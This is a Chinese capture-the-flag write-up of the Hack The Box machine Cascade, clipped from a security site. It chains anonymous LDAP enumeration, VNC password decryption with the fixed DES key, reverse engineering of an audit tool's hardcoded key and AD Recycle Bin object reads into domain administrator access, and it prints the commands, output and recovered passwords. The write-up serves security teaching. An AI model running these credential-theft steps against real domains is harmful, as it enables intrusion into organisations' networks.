---
title: 【先知】HTB-Cascade：从匿名 LDAP 到 AD 回收站的连锁提权
source: https://xz.aliyun.com/news/92585
source_host: xz.aliyun.com
clip_date: 2026-07-28T17:10:18+08:00
trace_id: 3cf90e0c-fe1b-4d53-9e46-7b9cb7be10e2
content_hash: 92200ed35bb71bccd7d86b0f71530ed4c63071e1fbab51b8c9a1cbf9b832520b
status: synced
tags:
  - 先知
  - Windows逆向
  - 风控对抗
series: null
feed_source: null
ai_summary: HTB-Cascade展示了从匿名LDAP泄露自定义属性密码，最终通过AD回收站特权组获取域管权限的完整横向提权链。
ai_summary_style: key-points
images_status:
  total: 6
  succeeded: 6
  failed_urls: []
notion_page_id: 3ab75244-d011-81dc-8831-d0545194a70a
ioc:
  cves: []
  cwes: []
  hashes:
    - "0001011101010010011010110000011000100011010011100101100000000111"
    - "1110000000011010011100101100010001100000110101100100101011101000"
  domains: []
  tools: []
  techniques: []
---

> 💡 **AI 总结（key-points）**
>
> HTB-Cascade展示了从匿名LDAP泄露自定义属性密码，最终通过AD回收站特权组获取域管权限的完整横向提权链。
> 
> - **LDAP匿名枚举泄露密码：** 匿名LDAP查询发现用户r.thompson的自定义属性`cascadeLegacyPwd`字段包含Base64编码的密码`rY4n5eva`。
> - **SMB共享中的VNC密码恢复：** 利用r.thompson凭证访问Data共享，从`VNC Install.reg`提取VNC DES加密的密码，结合VNC修改后的比特反转算法解密出s.smith的密码`sT333ve2`。
> - **审计程序逆向获取ArkSvc凭证：** 通过s.smith访问Audit$共享，逆向`CascAudit.exe`发现其使用硬编码密钥`c4scadek3y654321`解密SQLite数据库中的`ArkSvc`密码，得到`w3lc0meFr31nd`。
> - **AD回收站组权限滥用：** ArkSvc属于AD Recycle Bin组，可查询已删除对象，发现已删除的TempAdmin账户遗留的自定义属性`cascadeLegacyPwd`值`YmFDVDNyMWFOMDBkbGVz`，解码后为`baCT3r1aN00dles`。
> - **密码复用获取域管权限：** TempAdmin密码与管理员相同，使用该密码通过WinRM登录Administrator，完成完全控制。

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/5bb2097ac38a70a0.png)

## 一、Nmap

TCP 全端口扫描：

```bash
$ sudo nmap -sS -p- -Pn -n -T4 --min-rate 5000 10.129.34.152 -oA tcp_ports
Starting Nmap 7.95 ( https://nmap.org ) at 2026-07-25 03:11 EDT
Nmap scan report for 10.129.34.152
Host is up (0.0085s latency).
Not shown: 65520 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
49154/tcp open  unknown
49155/tcp open  unknown
49157/tcp open  unknown
49158/tcp open  unknown
49166/tcp open  unknown
```

提取开放端口：

```bash
$ cat tcp_ports.nmap | grep -oP '^\d+' | paste -s -d ','
53,88,135,139,389,445,636,3268,3269,5985,49154,49155,49157,49158,49166
```

对开放的端口进行详细扫描：

```bash
$ sudo nmap -sC -sV --reason -Pn -n -p 53,88,135,139,389,445,636,3268,3269,5985,49154,49155,49157,49158,49166 10.129.34.152 -oA tcp_ports_detail
Starting Nmap 7.95 ( https://nmap.org ) at 2026-07-25 03:13 EDT
Nmap scan report for 10.129.34.152
Host is up, received user-set (0.0079s latency).

PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2026-07-25 07:12:25Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
636/tcp   open  tcpwrapped    syn-ack ttl 127
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49154/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49155/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49157/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49166/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: CASC-DC1; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-07-25T07:13:15
|_  start_date: 2026-07-25T07:08:02
|_clock-skew: -1m21s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 94.31 seconds
```

根据端口的开放的情况判断，目标是 AD 中的 DC。

扫描结果中暴露了域名：

```plain
cascade.local
```

添加到本地的 `hosts` 文件中：

```bash
$ echo '10.129.34.152 cascade.local' | sudo tee -a /etc/hosts
10.129.34.152 cascade.local
```

## 二、枚举

### 1、SMB

SMB 匿名枚举共享：

```bash
$ smbmap -H 10.129.34.152 -u '' -p ''

[*] Detected 1 hosts serving SMB
[*] Established 1 SMB connections(s) and 1 authenticated session(s)
[!] Access denied on 10.129.34.152, no fun for you...
[*] Closed 1 connections
```

无输出。

用 guest 用户 + 空密码尝试：

```bash
$ smbmap -H 10.129.34.152 -u 'guest' -p ''

[*] Detected 1 hosts serving SMB
[*] Established 1 SMB connections(s) and 0 authenticated session(s)
[!] Access denied on 10.129.34.152, no fun for you...
[*] Closed 1 connections
```

依旧没有输出。

### 2、LDAP

LDAP 匿名枚举用户：

```bash
$ netexec ldap 10.129.34.152 -u '' -p '' --users
LDAP        10.129.34.152   389    CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 (name:CASC-DC1) (domain:cascade.local) (signing:None) (channel binding:No TLS cert)
LDAP        10.129.34.152   389    CASC-DC1         [+] cascade.local\:
LDAP        10.129.34.152   389    CASC-DC1         [*] Enumerated 15 domain users: cascade.local
LDAP        10.129.34.152   389    CASC-DC1         -Username-                    -Last PW Set-       -BadPW-  -Description-                                  
LDAP        10.129.34.152   389    CASC-DC1         CascGuest                     <never>             0        Built-in account for guest access to the computer/domain
LDAP        10.129.34.152   389    CASC-DC1         arksvc                        2020-01-10 00:18:20 0                                                       
LDAP        10.129.34.152   389    CASC-DC1         s.smith                       2020-01-29 03:58:05 0                                                       
LDAP        10.129.34.152   389    CASC-DC1         r.thompson                    2020-01-10 03:31:26 0                                                       
LDAP        10.129.34.152   389    CASC-DC1         util                          2020-01-13 10:07:11 0                                                       
LDAP        10.129.34.152   389    CASC-DC1         j.wakefield                   2020-01-10 04:34:44 0                                                       
LDAP        10.129.34.152   389    CASC-DC1         s.hickson                     2020-01-13 09:24:27 0                                                       
LDAP        10.129.34.152   389    CASC-DC1         j.goodhand                    2020-01-13 09:40:26 0                                                       
LDAP        10.129.34.152   389    CASC-DC1         a.turnbull                    2020-01-13 09:43:13 0                                                       
LDAP        10.129.34.152   389    CASC-DC1         e.crowe                       2020-01-13 11:45:02 0                                                       
LDAP        10.129.34.152   389    CASC-DC1         b.hanson                      2020-01-14 00:35:39 0                                                       
LDAP        10.129.34.152   389    CASC-DC1         d.burman                      2020-01-14 00:36:12 0                                                       
LDAP        10.129.34.152   389    CASC-DC1         BackupSvc                     2020-01-14 00:37:03 0                                                       
LDAP        10.129.34.152   389    CASC-DC1         j.allen                       2020-01-14 01:23:59 0                                                       
LDAP        10.129.34.152   389    CASC-DC1         i.croft                       2020-01-16 05:46:21 0
```

制作用户字典：

```plain
$ cat tmp | awk '{print $5}' >> user.txt

$ cat user.txt
CascGuest
arksvc
s.smith
r.thompson
util
j.wakefield
s.hickson
j.goodhand
a.turnbull
e.crowe
b.hanson
d.burman
BackupSvc
j.allen
i.croft
```

继续匿名进行查询：

```bash
$ ldapsearch -H ldap://10.129.34.152 -x -b 'DC=cascade,DC=local' "(objectClass=*)" >> results.txt
```

结果有 6363 行：

```bash
$ wc -l results.txt
6363 results.txt
```

我尝试过滤一些可能泄露凭证的关键字，比如：

```plain
pwd
password
secret
default
```

最终：

```bash
$ cat results.txt | rg -i pwd | awk '!seen[$0]++' | rg -v pwdLastSet
maxPwdAge: -9223372036854775808
minPwdAge: 0
minPwdLength: 5
pwdProperties: 0
pwdHistoryLength: 0
badPwdCount: 0
maxPwdAge: -37108517437440
minPwdLength: 0
cascadeLegacyPwd: clk0bjVldmE=
```

去 `results.txt` 文件中检索：

```plain
cascadeLegacyPwd: clk0bjVldmE=
```

找到：

```plain
# Ryan Thompson, Users, UK, cascade.local
dn: CN=Ryan Thompson,OU=Users,OU=UK,DC=cascade,DC=local
[snip]
userPrincipalName: r.thompson@cascade.local
[snip]
cascadeLegacyPwd: clk0bjVldmE=
```

解码后得到的密码是：

```plain
echo 'clk0bjVldmE=' | base64 -d
rY4n5eva
```

但是该账户并没有 WinRM 登录权限：

```bash
$ netexec winrm 10.129.34.152 -u 'r.thompson' -p 'rY4n5eva'
WINRM       10.129.34.152   5985   CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 (name:CASC-DC1) (domain:cascade.local)
WINRM       10.129.34.152   5985   CASC-DC1         [-] cascade.local\r.thompson:rY4n5eva
```

## 三、SMB again

用该凭证进行 SMB 共享枚举：

```bash
$ smbmap -H 10.129.34.152 -u 'r.thompson' -p 'rY4n5eva'

[*] Detected 1 hosts serving SMB
[*] Established 1 SMB connections(s) and 1 authenticated session(s)

[+] IP: 10.129.34.152:445       Name: cascade.local             Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        Audit$                                                  NO ACCESS
        C$                                                      NO ACCESS       Default share
        Data                                                    READ ONLY
        IPC$                                                    NO ACCESS       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share
        print$                                                  READ ONLY       Printer Drivers
        SYSVOL                                                  READ ONLY       Logon server share
```

有四个可读的共享资源。

`netexec` 提供了一个 Spider Share 的功能，它需要你提供一个 `pattern` 参数，其部分源码：

```python
def dir_list(self, files, path):
    path = path.replace("*", "")
    for result in files:
        if self.pattern:
            for pattern in self.pattern:
                if bytes(result.get_longname().lower(), "utf8").find(bytes(pattern.lower(), "utf8")) != -1:
                [snip]
```

当我提供：

```bash
--pattern ''
```

的时候，检索的代码就变成：

```python
.find('')
```

这将匹配所有的文件。

先爬取 Data Share 中的文件：

```bash
$ netexec smb 10.129.34.152 -u 'r.thompson' -p 'rY4n5eva' --spider Data --pattern '' >> tmp
```

过滤非目录的信息：

```bash
$ cat tmp | rg -v '\[dir\]|\[\+\]|\[\*\]'
SMB                      10.129.34.152   445    CASC-DC1         //10.129.34.152/Data/IT/Email Archives/Meeting_Notes_June_2018.html [lastm:'2020-01-29 02:00' size:2522]
SMB                      10.129.34.152   445    CASC-DC1         //10.129.34.152/Data/IT/Logs/Ark AD Recycle Bin/ArkAdRecycleBin.log [lastm:'2020-01-29 09:19' size:1303]
SMB                      10.129.34.152   445    CASC-DC1         //10.129.34.152/Data/IT/Logs/DCs/dcdiag.log [lastm:'2020-01-27 06:22' size:5967]
SMB                      10.129.34.152   445    CASC-DC1         //10.129.34.152/Data/IT/Temp/s.smith/VNC Install.reg [lastm:'2020-01-29 04:00' size:2680]
```

通过 `smbclient` 访问共享资源，查看上面看到的四个文件：

```bash
$ smbclient //10.129.34.152/Data -U 'r.thompson%rY4n5eva'
Try "help" to get a list of possible commands.
smb: \>
```

`Meeting_Notes_June_2018.html` 文件是 Steve Smith 向昨天开会开溜的员工 Ben 的一个对接记录：

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/99659fb01589ab81.png)

其中提到一个用于完成“网络迁移相关的所有任务”的临时账号：

```plain
TempAdmin
```

还提到，其密码和普通管理员账号的密码相同。

`ArkAdRecycleBin.log` 该日志记录了 `CASCADE\ArkSvc` 完成了对 `TempAdmin` 账号的清除：

```plain
1/10/2018 15:43 [MAIN_THREAD]   ** STARTING - ARK AD RECYCLE BIN MANAGER v1.2.2 **
1/10/2018 15:43 [MAIN_THREAD]   Validating settings...
1/10/2018 15:43 [MAIN_THREAD]   Error: Access is denied
1/10/2018 15:43 [MAIN_THREAD]   Exiting with error code 5
2/10/2018 15:56 [MAIN_THREAD]   ** STARTING - ARK AD RECYCLE BIN MANAGER v1.2.2 **
2/10/2018 15:56 [MAIN_THREAD]   Validating settings...
2/10/2018 15:56 [MAIN_THREAD]   Running as user CASCADE\ArkSvc
2/10/2018 15:56 [MAIN_THREAD]   Moving object to AD recycle bin CN=Test,OU=Users,OU=UK,DC=cascade,DC=local
2/10/2018 15:56 [MAIN_THREAD]   Successfully moved object. New location CN=Test\0ADEL:ab073fb7-6d91-4fd1-b877-817b9e1b0e6d,CN=Deleted Objects,DC=cascade,DC=local
2/10/2018 15:56 [MAIN_THREAD]   Exiting with error code 0
8/12/2018 12:22 [MAIN_THREAD]   ** STARTING - ARK AD RECYCLE BIN MANAGER v1.2.2 **
8/12/2018 12:22 [MAIN_THREAD]   Validating settings...
8/12/2018 12:22 [MAIN_THREAD]   Running as user CASCADE\ArkSvc
8/12/2018 12:22 [MAIN_THREAD]   Moving object to AD recycle bin CN=TempAdmin,OU=Users,OU=UK,DC=cascade,DC=local
8/12/2018 12:22 [MAIN_THREAD]   Successfully moved object. New location CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local
8/12/2018 12:22 [MAIN_THREAD]   Exiting with error code 0
```

`dcdiag.log` 是针对 DC 的诊断日志，其中并没有什么关键的信息。

`VNC Install.reg` 中能发现一串密码信息：

```plain
"Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f
```

但这似乎并不能转换成对应的 ASCII 字符串：

```bash
$ python
Python 3.13.5 (main, May  5 2026, 21:05:52) [GCC 14.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> t = '6b,cf,2a,4b,6e,5a,ca,0f'
>>> print(t.replace(",",""))
6bcf2a4b6e5aca0f
>>> h = '6bcf2a4b6e5aca0f'
>>> print(bytes.fromhex(h).decode())
Traceback (most recent call last):
  File "<python-input-3>", line 1, in <module>
    print(bytes.fromhex(h).decode())
          ~~~~~~~~~~~~~~~~~~~~~~~^^
UnicodeDecodeError: 'utf-8' codec can't decode byte 0xcf in position 1: invalid continuation byte
>>> print(bytes.fromhex(h))
b'k\xcf*KnZ\xca\x0f'
```

似乎是经过加密的。

## 四、VNC

VNC 全称为“Virtual Network Computer”，一种能让你远程控制电脑的技术。

VNC Password 允许你“使用主机密码以外的密码”来远程访问计算机。

搜索：

```plain
VNC Password Decode
```

能找到这篇 [文章](https://github.com/frizb/PasswordDecrypts) ，其提到 VNC Password 采用 DES 来加密，并且使用固定密钥。

按文档说的方法解密，得到：

```bash
$ echo -n 6bcf2a4b6e5aca0f | xxd -r -p | openssl enc -des-cbc --nopad --nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d
sT333ve2
```

VNC 早期的开源代码不方便找到，能看到社区根据早期代码进行后续维护的 [项目](https://github.com/TurboVNC/turbovnc) ，在 `vncauth.c` 文件中能看到硬编码的密钥信息：

```c
/*
 * We use a fixed key to store passwords, since we assume that our local
 * file system is secure but nonetheless don't want to store passwords
 * as plain text.
 */

static unsigned char s_fixedkey[8] = { 23, 82, 107, 6, 35, 78, 88, 7 };
```

也能看到用 DES 保护密码的函数：

```c
int vncEncryptAndStorePasswd2(char *passwd, char *passwdViewOnly, char *fname)
{
  FILE *fp;
  int bytesToWrite, bytesWrote;
  unsigned char encryptedPasswd[16] = {
    0, 0, 0, 0, 0, 0, 0, 0,
    0, 0, 0, 0, 0, 0, 0, 0
  };

  if (strcmp(fname, "-") != 0) {
    fp = fopen(fname, "w");
    if (fp == NULL) {
      return 0;
    }
    chmod(fname, S_IRUSR | S_IWUSR);
  } else
    fp = stdout;

  strncpy((char *)encryptedPasswd, passwd, 8);
  if (passwdViewOnly != NULL)
    memcpy((char *)encryptedPasswd + 8, passwdViewOnly, 8);

  /* Do encryption in place - this way, we overwrite our copies of
     plain-text passwords. */
  deskey(s_fixedkey, EN0);
  des(encryptedPasswd, encryptedPasswd);
  if (passwdViewOnly != NULL)
    des(encryptedPasswd + 8, encryptedPasswd + 8);

  bytesToWrite = (passwdViewOnly == NULL) ? 8 : 16;
  bytesWrote = fwrite(encryptedPasswd, 1, bytesToWrite, fp);

  if (fp != stdout)
    fclose(fp);
  return (bytesWrote == bytesToWrite);
}
```

这串信息：

```plain
23, 82, 107, 6, 35, 78, 88, 7
```

转换成 16 进制是：

```bash
$ python
Python 3.13.5 (main, May  5 2026, 21:05:52) [GCC 14.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> s = [23, 82, 107, 6, 35, 78, 88, 7]
>>> print(bytes(s).hex())
17526b06234e5807
```

和之前使用的解密密钥不一致：

```plain
e84ad660c4721ae0
```

这是因为 VNC 对 DES 进行了微小的调整，在 `./common/d3des/d3des.c` 文件中能看到：

```c
static unsigned short bytebit[8]        = {
        01, 02, 04, 010, 020, 040, 0100, 0200 };
```

> C 语言中，0开头的为 8 进制。

这和原始的（16 进制表示）：

```c
{ 0x80, 0x40, 0x20, 0x10, 0x08, 0x04, 0x02, 0x01 }
```

刚好相反。

这意味着：

-   原先：先取最高位（bit7），再取 bit6 … 最后取最低位（bit0）
-   现在：先取最低位（bit0），再取 bit1 … 最后取最高位（bit7）

但 VNC 实现 DES 子密钥生成算法的时候，依旧采用了正常模式。这就导致填入的密钥要按比特反着写，即：

```bash
>>> data = [23, 82, 107, 6, 35, 78, 88, 7]
>>> print(''.join(f'{d:08b}' for d in data))
0001011101010010011010110000011000100011010011100101100000000111
>>> print(''.join(f'{d:08b}' for d in data)[::-1])
1110000000011010011100101100010001100000110101100100101011101000
```

转换成十六进制：

```bash
>>> b = '1110000000011010011100101100010001100000110101100100101011101000'
>>> print(hex(int(b,2))[2:])
e01a72c460d64ae8
```

这就是之前使用的正确的密钥了。

总之，我得到了一个新的凭证：

```plain
username: s.smith
password: sT333ve2
```

## 五、s.smith shell

利用 `evil-winrm` 工具获得 s.smith 的 Shell：

```bash
$ evil-winrm -i 10.129.34.152 -u 's.smith' -p 'sT333ve2'

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\s.smith\Documents>
```

在 Desktop 目录中能找到 User Flag：

```powershell
*Evil-WinRM* PS C:\Users\s.smith\Desktop> cat user.txt
e086d4*******************
```

查看用户的组信息：

```powershell
*Evil-WinRM* PS C:\> net user s.smith /domain
User name                    s.smith
Full Name                    Steve Smith
Comment
User's comment
Country code                 000 (System Default)
Account active               Yes
Account expires              Never

Password last set            1/28/2020 8:58:05 PM
Password expires             Never
Password changeable          1/28/2020 8:58:05 PM
Password required            Yes
User may change password     No

Workstations allowed         All
Logon script                 MapAuditDrive.vbs
User profile
Home directory
Last logon                   1/29/2020 12:26:39 AM

Logon hours allowed          All

Local Group Memberships      *Audit Share          *IT
                             *Remote Management Use
Global Group memberships     *Domain Users
The command completed successfully.
```

Audit Share 似乎和共享资源有关系，我打算用该凭证再用 `smbmap` 枚举一下共享资源：

```bash
$ smbmap -H 10.129.34.152 -u 's.smith' -p 'sT333ve2'

[+] IP: 10.129.34.152:445       Name: cascade.local             Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        Audit$                                                  READ ONLY
        C$                                                      NO ACCESS       Default share
        Data                                                    READ ONLY
        IPC$                                                    NO ACCESS       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share
        print$                                                  READ ONLY       Printer Drivers
        SYSVOL                                                  READ ONLY       Logon server share
[*] Closed 1 connections
```

该用户的确对一个叫 `Audit$` 的共享资源有读权限。

列举共享资源中的文件：

```bash
$ netexec smb 10.129.34.152 -u 's.smith' -p 'sT333ve2' --spider Audit\$ --pattern '' >> audit

$ cat audit | rg -v '\[dir\]|\[\*\]|\[\+\]'
SMB                      10.129.34.152   445    CASC-DC1         //10.129.34.152/Audit$/CascAudit.exe [lastm:'2020-01-29 05:47' size:13312]
SMB                      10.129.34.152   445    CASC-DC1         //10.129.34.152/Audit$/CascCrypto.dll [lastm:'2020-01-30 02:01' size:12288]
SMB                      10.129.34.152   445    CASC-DC1         //10.129.34.152/Audit$/RunAudit.bat [lastm:'2020-01-29 07:29' size:45]
SMB                      10.129.34.152   445    CASC-DC1         //10.129.34.152/Audit$/System.Data.SQLite.dll [lastm:'2020-01-29 04:42' size:363520]
SMB                      10.129.34.152   445    CASC-DC1         //10.129.34.152/Audit$/System.Data.SQLite.EF6.dll [lastm:'2020-01-29 04:42' size:186880]
SMB                      10.129.34.152   445    CASC-DC1         //10.129.34.152/Audit$/DB/Audit.db [lastm:'2020-01-29 05:43' size:24576]
SMB                      10.129.34.152   445    CASC-DC1         //10.129.34.152/Audit$/x64/SQLite.Interop.dll [lastm:'2020-01-29 04:42' size:1639936]
SMB                      10.129.34.152   445    CASC-DC1         //10.129.34.152/Audit$/x86/SQLite.Interop.dll [lastm:'2020-01-29 04:42' size:1246720]
```

有一个数据库文件，而且使用的应该是 SQLite（文件名提示）。

查看：

```bash
$ sqlite3 Audit.db
SQLite version 3.46.1 2024-08-13 09:16:08
Enter ".help" for usage hints.
sqlite> .tables
DeletedUserAudit  Ldap              Misc
sqlite> .dump DeletedUserAudit
PRAGMA foreign_keys=OFF;
BEGIN TRANSACTION;
CREATE TABLE IF NOT EXISTS "DeletedUserAudit" (
        "Id"    INTEGER PRIMARY KEY AUTOINCREMENT,
        "Username"      TEXT,
        "Name"  TEXT,
        "DistinguishedName"     TEXT
);
INSERT INTO DeletedUserAudit VALUES(6,'test',replace('Test\nDEL:ab073fb7-6d91-4fd1-b877-817b9e1b0e6d','\n',char(10)),'CN=Test\0ADEL:ab073fb7-6d91-4fd1-b877-817b9e1b0e6d,CN=Deleted Objects,DC=cascade,DC=local');
INSERT INTO DeletedUserAudit VALUES(7,'deleted',replace('deleted guy\nDEL:8cfe6d14-caba-4ec0-9d3e-28468d12deef','\n',char(10)),'CN=deleted guy\0ADEL:8cfe6d14-caba-4ec0-9d3e-28468d12deef,CN=Deleted Objects,DC=cascade,DC=local');
INSERT INTO DeletedUserAudit VALUES(9,'TempAdmin',replace('TempAdmin\nDEL:5ea231a1-5bb4-4917-b07a-75a57f4c188a','\n',char(10)),'CN=TempAdmin\0ADEL:5ea231a1-5bb4-4917-b07a-75a57f4c188a,CN=Deleted Objects,DC=cascade,DC=local');
COMMIT;
sqlite> .dump Ldap
PRAGMA foreign_keys=OFF;
BEGIN TRANSACTION;
CREATE TABLE IF NOT EXISTS "Ldap" (
        "Id"    INTEGER PRIMARY KEY AUTOINCREMENT,
        "uname" TEXT,
        "pwd"   TEXT,
        "domain"        TEXT
);
INSERT INTO Ldap VALUES(1,'ArkSvc','BQO5l5Kj9MdErXx6Q6AGOw==','cascade.local');
COMMIT;
sqlite> .dump Misc
PRAGMA foreign_keys=OFF;
BEGIN TRANSACTION;
CREATE TABLE IF NOT EXISTS "Misc" (
        "Id"    INTEGER PRIMARY KEY AUTOINCREMENT,
        "Ext1"  TEXT,
        "Ext2"  TEXT
);
COMMIT;
```

根据字段名， `Ldap` 表中有密码的相关信息：

```bash
sqlite> select * from Ldap;
1|ArkSvc|BQO5l5Kj9MdErXx6Q6AGOw==|cascade.local
```

base64 解码之后是乱码：

```bash
$ echo BQO5l5Kj9MdErXx6Q6AGOw== | base64 -d | xxd
00000000: 0503 b997 92a3 f4c7 44ad 7c7a 43a0 063b  ........D.|zC..;
```

应该是被加密处理过的。

## 六、CascAudit.exe 逆向分析

在共享资源中，还能看到一个 `CascAudit.exe` 文件。

我打算将该共享资源中的所有信息都下载到本地：

```bash
smb: \> mask ""
smb: \> recurse ON
smb: \> prompt OFF
smb: \> mget *
getting file \CascAudit.exe of size 13312 as CascAudit.exe (6.4 KiloBytes/sec) (average 11.0 KiloBytes/sec)
getting file \CascCrypto.dll of size 12288 as CascCrypto.dll (8.8 KiloBytes/sec) (average 10.4 KiloBytes/sec)
getting file \RunAudit.bat of size 45 as RunAudit.bat (0.1 KiloBytes/sec) (average 8.8 KiloBytes/sec)
getting file \System.Data.SQLite.dll of size 363520 as System.Data.SQLite.dll (48.9 KiloBytes/sec) (average 31.5 KiloBytes/sec)
getting file \System.Data.SQLite.EF6.dll of size 186880 as System.Data.SQLite.EF6.dll (66.1 KiloBytes/sec) (average 37.6 KiloBytes/sec)
getting file \DB\Audit.db of size 24576 as DB/Audit.db (22.4 KiloBytes/sec) (average 36.6 KiloBytes/sec)
getting file \x64\SQLite.Interop.dll of size 1639936 as x64/SQLite.Interop.dll (146.6 KiloBytes/sec) (average 80.2 KiloBytes/sec)
getting file \x86\SQLite.Interop.dll of size 1246720 as x86/SQLite.Interop.dll (129.3 KiloBytes/sec) (average 92.7 KiloBytes/sec)
```

Bat 脚本中写明了用法：

```plain
CascAudit.exe "\\CASC-DC1\Audit$\DB\Audit.db"
```

由于目录结构的改变，我应该执行：

```plain
CascAudit.exe ".\DB\Audit.db"
```

运行：

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/bdf4c39ebf97868e.png)

我打算用 `dnSpy` 反编译这个文件。

其中有这么一段代码：

```c
string str = string.Empty;
string password = string.Empty;
string str2 = string.Empty;
try
{
    sqliteConnection.Open();
    using (SQLiteCommand sqliteCommand = new SQLiteCommand("SELECT * FROM LDAP", sqliteConnection))
    {
        using (SQLiteDataReader sqliteDataReader = sqliteCommand.ExecuteReader())
        {
            sqliteDataReader.Read();
            str = Conversions.ToString(sqliteDataReader["Uname"]);
            str2 = Conversions.ToString(sqliteDataReader["Domain"]);
            string encryptedString = Conversions.ToString(sqliteDataReader["Pwd"]);
            try
            {
                password = Crypto.DecryptString(encryptedString, "c4scadek3y654321");
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error decrypting password: " + ex.Message);
                return;
            }
        }
    }
    sqliteConnection.Close();
```

它从 Ldap 表中取出 Pwd 字段的值，并进行了解密操作：

```c
Crypto.DecryptString(encryptedString, "c4scadek3y654321")
```

我打算在：

```c
sqliteConnection.Close();
```

这段代码下断点，这样我就可以查看解密后的值。

运行（注意指定参数）：

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/7ce967856265f333.png)

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/09ec4c0709a64004.png)

密码为：

```plain
w3lc0meFr31nd
```

## 七、ArkSvc Shell

利用新获取的凭证，通过 `evil-winrm` 我可以获得其 Shell：

```bash
$ evil-winrm -i 10.129.34.152 -u 'ArkSvc' -p 'w3lc0meFr31nd'

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\arksvc\Documents>
```

查看用户组信息：

```bash
*Evil-WinRM* PS C:\> net user ArkSvc /domain
User name                    arksvc
Full Name                    ArkSvc
Comment
User's comment
Country code                 000 (System Default)
Account active               Yes
Account expires              Never

Password last set            1/9/2020 5:18:20 PM
Password expires             Never
Password changeable          1/9/2020 5:18:20 PM
Password required            Yes
User may change password     No

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   1/29/2020 10:05:40 PM

Logon hours allowed          All

Local Group Memberships      *AD Recycle Bin       *IT
                             *Remote Management Use
Global Group memberships     *Domain Users
The command completed successfully.
```

他属于 `AD Recycle Bin` 组。

## 八、Root Flag

在 HackTricks 中有关于 `AD Recycle Bin` 组的滥用：

```plain
https://hacktricks.wiki/en/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges.html
```

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/280f7903232045e0.png)

该组的成员允许读取已删除的 Active Directory 对象，这可能会泄露敏感信息。

运行命令后可以看到泄露的 TempAdmin 的密码：

```bash
*Evil-WinRM* PS C:\> Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *

[snip]
CanonicalName                   : cascade.local/Deleted Objects/TempAdmin
cascadeLegacyPwd                : YmFDVDNyMWFOMDBkbGVz
[snip]
```

之前看到的 `ArkAdRecycleBin.log` 和 HTML 文件中提到过：该用户已经被清除，并且其密码和普通管理员的密码是一致的。

尝试获取 administrator 的 Shell：

```bash
$ evil-winrm -i 10.129.34.152 -u 'administrator' -p 'baCT3r1aN00dles'

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

